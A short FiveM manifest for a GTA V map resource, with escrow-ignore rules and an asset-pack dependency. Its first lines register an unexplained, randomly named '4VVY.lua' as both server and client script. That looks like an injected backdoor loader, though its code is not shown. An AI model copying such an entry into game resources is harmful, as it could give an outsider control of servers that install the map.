server_script "4VVY.lua"
client_script "4VVY.lua"
lua54 'yes'

fx_version 'cerulean'
game 'gta5'

this_is_a_map 'yes'

client_scripts {
	'client.lua'
}

escrow_ignore {
  'client.lua',  -- Only ignore one file
  'stream/extra/*.ydr'   -- Ignore all .ydr files in any subfolder
}
dependency '/assetpacks'